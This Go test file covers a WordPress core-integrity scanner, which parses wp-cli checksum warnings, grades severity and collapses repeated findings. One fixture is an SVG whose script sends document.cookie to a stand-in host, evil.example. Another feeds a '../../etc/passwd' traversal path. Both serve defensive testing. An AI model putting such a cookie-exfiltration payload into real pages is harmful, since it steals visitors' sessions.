package checks

import (
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
)

func wpCoreCheckMocks(t *testing.T, wpOutput string) {
	t.Helper()
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if strings.Contains(pattern, "wp-config.php") {
				return []string{"/home/alice/public_html/wp-config.php"}, nil
			}
			return nil, nil
		},
		lstat: func(name string) (os.FileInfo, error) {
			return mockPathInfo(name, []string{"/home/alice/public_html/wp-config.php"})
		},
	})
	withMockCmd(t, &mockCmd{
		runContext: func(_ context.Context, name string, _ ...string) ([]byte, error) {
			if name == "wp" {
				return []byte(wpOutput), fmt.Errorf("exit status 1")
			}
			return nil, nil
		},
	})
}

func coreIntegrityFindings(findings []alert.Finding) []alert.Finding {
	var out []alert.Finding
	for _, f := range findings {
		if f.Check == "wp_core_integrity" {
			out = append(out, f)
		}
	}
	return out
}

// A backdoor appended to a shipped core file is the most common core
// compromise, and wp-cli reports it as a checksum mismatch, not as an extra
// file. That line must become a finding that names the file.
func TestCheckWPCoreReportsModifiedCoreFile(t *testing.T) {
	wpCoreCheckMocks(t, "Warning: File doesn't verify against checksum: wp-includes/plugin.php\n"+
		"Error: WordPress installation doesn't verify against checksums.\n")

	got := coreIntegrityFindings(CheckWPCore(context.Background(), &config.Config{}, nil))
	if len(got) != 1 {
		t.Fatalf("findings = %d, want 1: %+v", len(got), got)
	}
	f := got[0]
	if f.Severity != alert.Critical {
		t.Errorf("severity = %v, want Critical", f.Severity)
	}
	if f.FilePath != "/home/alice/public_html/wp-includes/plugin.php" {
		t.Errorf("FilePath = %q, want the modified core file", f.FilePath)
	}
	if !strings.Contains(f.Details, "Path: /home/alice/public_html") {
		t.Errorf("Details must carry the install path for Re-check: %q", f.Details)
	}
}

// Critical drives auto-response, which kills processes and quarantines files.
// A core asset that PHP never executes cannot be the appended backdoor this
// check exists to catch, and on real hosts these mismatch for dull reasons: an
// SVG or CSS run through an optimiser, or an install whose version.php no
// longer matches the release its files came from. Those still deserve a
// finding, just not one that acts on its own.
func TestCheckWPCoreGradesNonExecutableCoreFilesBelowCritical(t *testing.T) {
	wpCoreCheckMocks(t, "Warning: File doesn't verify against checksum: wp-includes/css/dashicons.css\n"+
		"Warning: File doesn't verify against checksum: wp-includes/images/w-logo-blue.png\n"+
		"Warning: File doesn't verify against checksum: wp-includes/plugin.php\n")

	got := coreIntegrityFindings(CheckWPCore(context.Background(), &config.Config{}, nil))
	if len(got) != 3 {
		t.Fatalf("findings = %d, want 3: %+v", len(got), got)
	}
	bySeverity := map[string]alert.Severity{}
	for _, f := range got {
		bySeverity[f.FilePath] = f.Severity
	}
	for _, path := range []string{
		"/home/alice/public_html/wp-includes/css/dashicons.css",
		"/home/alice/public_html/wp-includes/images/w-logo-blue.png",
	} {
		if got := bySeverity[path]; got != alert.High {
			t.Errorf("severity for %s = %v, want High", path, got)
		}
	}
	if got := bySeverity["/home/alice/public_html/wp-includes/plugin.php"]; got != alert.Critical {
		t.Errorf("severity for the PHP core file = %v, want Critical", got)
	}
}

// SVG is markup, not an image format: it carries <script> and event handlers,
// and the browser runs them. A core SVG that gained active content is a real
// compromise, so the grading has to look at what is in the file rather than
// trust the extension.
func TestCheckWPCoreKeepsActiveSVGCritical(t *testing.T) {
	dir := t.TempDir()
	install := filepath.Join(dir, "public_html")
	svgDir := filepath.Join(install, "wp-includes", "js")
	if err := os.MkdirAll(svgDir, 0o755); err != nil {
		t.Fatal(err)
	}
	active := "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>fetch('//evil.example/'+document.cookie)</script></svg>"
	if err := os.WriteFile(filepath.Join(svgDir, "active.svg"), []byte(active), 0o644); err != nil {
		t.Fatal(err)
	}
	inert := "<svg xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M0 0h10v10H0z\"/></svg>"
	if err := os.WriteFile(filepath.Join(svgDir, "inert.svg"), []byte(inert), 0o644); err != nil {
		t.Fatal(err)
	}

	if got := wpCoreModifiedSeverity(filepath.Join(install, "wp-includes/js/active.svg"), "wp-includes/js/active.svg"); got != alert.Critical {
		t.Errorf("severity for an SVG carrying script = %v, want Critical", got)
	}
	if got := wpCoreModifiedSeverity(filepath.Join(install, "wp-includes/js/inert.svg"), "wp-includes/js/inert.svg"); got != alert.High {
		t.Errorf("severity for a drawing-only SVG = %v, want High", got)
	}
	// An unreadable file is not evidence of innocence.
	if got := wpCoreModifiedSeverity(filepath.Join(install, "wp-includes/js/gone.svg"), "wp-includes/js/gone.svg"); got != alert.Critical {
		t.Errorf("severity for an unreadable SVG = %v, want Critical", got)
	}
}

// A core .js file is not executed by PHP but is served to every visitor, so a
// skimmer spliced into one is exactly as reachable as a PHP backdoor.
func TestCheckWPCoreKeepsScriptCoreFilesCritical(t *testing.T) {
	wpCoreCheckMocks(t, "Warning: File doesn't verify against checksum: wp-includes/js/jquery/jquery.js\n")

	got := coreIntegrityFindings(CheckWPCore(context.Background(), &config.Config{}, nil))
	if len(got) != 1 {
		t.Fatalf("findings = %d, want 1: %+v", len(got), got)
	}
	if got[0].Severity != alert.Critical {
		t.Errorf("severity = %v, want Critical for a served script", got[0].Severity)
	}
}

// Older wp-cli releases put the file name first.
func TestCheckWPCoreReportsModifiedCoreFileLegacyLineShape(t *testing.T) {
	wpCoreCheckMocks(t, "Warning: wp-includes/x.php doesn't verify against checksum.\n")

	got := coreIntegrityFindings(CheckWPCore(context.Background(), &config.Config{}, nil))
	if len(got) != 1 {
		t.Fatalf("findings = %d, want 1: %+v", len(got), got)
	}
	if got[0].FilePath != "/home/alice/public_html/wp-includes/x.php" {
		t.Errorf("FilePath = %q, want the modified core file", got[0].FilePath)
	}
}

// Localised installs ship their own readme and license; those two root files
// are the documented noise and carry no code.
func TestCheckWPCoreIgnoresLocalizedReadmeAndLicense(t *testing.T) {
	wpCoreCheckMocks(t, "Warning: File doesn't verify against checksum: readme.html\n"+
		"Warning: File doesn't verify against checksum: license.txt\n")

	if got := coreIntegrityFindings(CheckWPCore(context.Background(), &config.Config{}, nil)); len(got) != 0 {
		t.Fatalf("readme/license noise produced findings: %+v", got)
	}
}

func TestCheckWPCoreModifiedFileNeverEscapesInstall(t *testing.T) {
	wpCoreCheckMocks(t, "Warning: File doesn't verify against checksum: ../../etc/passwd\n")

	got := coreIntegrityFindings(CheckWPCore(context.Background(), &config.Config{}, nil))
	if len(got) != 1 {
		t.Fatalf("findings = %d, want 1 (the line is still reported): %+v", len(got), got)
	}
	if got[0].FilePath != "" {
		t.Errorf("a relative path that escapes the install must not become a FilePath, got %q", got[0].FilePath)
	}
}

func TestVerifyWPCoreStillHasModifiedFileUnresolved(t *testing.T) {
	tmp := t.TempDir()
	withWPVerifyAllowedRoots(t, tmp)
	dir := makeWPInstall(t, tmp, "frank")
	wpCoreVerifyMock(t, []byte("Warning: File doesn't verify against checksum: wp-includes/plugin.php\n"), errors.New("exit status 1"))

	res := VerifyFinding("wp_core_integrity", "WordPress core file modified for frank", "Path: "+dir)
	if !res.Checked || res.Resolved {
		t.Fatalf("a still-modified core file must verify unresolved, got %+v", res)
	}
}

// A modified core file in a subdomain or nested install is exactly the
// compromise wp_core_integrity exists to catch, and public_html-only discovery
// never saw it.
func TestCheckWPCore_DiscoversNestedAndAddonInstalls(t *testing.T) {
	old := osFS
	osFS = &mockOSGlobRoots{files: []string{
		"/home/alice/public_html/wp-config.php",
		"/home/alice/public_html/blog/wp-config.php",
		"/home/alice/shop.example.com/wp-config.php",
	}}
	t.Cleanup(func() { osFS = old })

	if got := wpCoreScanRoots(context.Background()); len(got) != 3 {
		t.Errorf("core-check roots = %v, want all three installs", got)
	}
}

// A core that was rebuilt from an older release leaves every file the newer
// release shipped behind, and wp-cli names each one on its own line. Those
// lines describe one condition -- this install's core is not the release it
// claims -- so they belong in one finding, not one per file. On a production
// host a single such install produced 1238 rows and buried everything else.
func TestCheckWPCoreCollapsesExtraneousFilesIntoOneFinding(t *testing.T) {
	var b strings.Builder
	for i := 0; i < 1200; i++ {
		fmt.Fprintf(&b, "Warning: File should not exist: wp-includes/blocks/block-%03d/style.css\n", i)
	}
	b.WriteString("Error: WordPress installation doesn't verify against checksums.\n")
	wpCoreCheckMocks(t, b.String())

	got := coreIntegrityFindings(CheckWPCore(context.Background(), &config.Config{}, nil))
	if len(got) != 1 {
		t.Fatalf("findings = %d, want 1", len(got))
	}
	f := got[0]
	if !strings.Contains(f.Details, "Path: /home/alice/public_html") {
		t.Errorf("Details must carry the install path for Re-check: %q", f.Details)
	}
	if !strings.Contains(f.Details, "1200") {
		t.Errorf("Details must state how many files were reported: %q", f.Details)
	}
	if n := strings.Count(f.Details, "should not exist"); n > wpCoreExtraneousSampleLimit {
		t.Errorf("Details listed %d sample lines, want at most %d", n, wpCoreExtraneousSampleLimit)
	}
	if n := strings.Count(f.Details, "should not exist"); n == 0 {
		t.Error("Details must show at least a sample of the reported files")
	}
}

// The set of extra files shifts as an operator deletes them one by one. That
// is progress on the same condition, not a new one, so the row has to keep its
// identity instead of stacking a fresh copy on every scan.
func TestCheckWPCoreExtraneousFindingKeepsIdentityAsFilesChange(t *testing.T) {
	run := func(extra string) alert.Finding {
		t.Helper()
		wpCoreCheckMocks(t, "Warning: File should not exist: wp-includes/blocks/avatar.php\n"+extra)
		got := coreIntegrityFindings(CheckWPCore(context.Background(), &config.Config{}, nil))
		if len(got) != 1 {
			t.Fatalf("findings = %d, want 1", len(got))
		}
		return got[0]
	}
	first := run("Warning: File should not exist: wp-includes/blocks/heading/style.css\n")
	second := run("")
	if first.Key() != second.Key() {
		t.Errorf("key changed as the file set shrank:\n first  = %q\n second = %q", first.Key(), second.Key())
	}
}

// Two installs failing the same way are two conditions to fix, so collapsing
// must be per install, never server-wide.
func TestCheckWPCoreExtraneousFindingIsPerInstall(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if strings.Contains(pattern, "wp-config.php") {
				return []string{
					"/home/alice/public_html/wp-config.php",
					"/home/bob/public_html/wp-config.php",
				}, nil
			}
			return nil, nil
		},
		lstat: func(name string) (os.FileInfo, error) {
			return mockPathInfo(name, []string{
				"/home/alice/public_html/wp-config.php",
				"/home/bob/public_html/wp-config.php",
			})
		},
	})
	withMockCmd(t, &mockCmd{
		runContext: func(_ context.Context, name string, _ ...string) ([]byte, error) {
			if name == "wp" {
				return []byte("Warning: File should not exist: wp-includes/blocks/avatar.php\n"), fmt.Errorf("exit status 1")
			}
			return nil, nil
		},
	})

	got := coreIntegrityFindings(CheckWPCore(context.Background(), &config.Config{}, nil))
	if len(got) != 2 {
		t.Fatalf("findings = %d, want one per install", len(got))
	}
	if got[0].Key() == got[1].Key() {
		t.Errorf("both installs share one identity: %q", got[0].Key())
	}
}
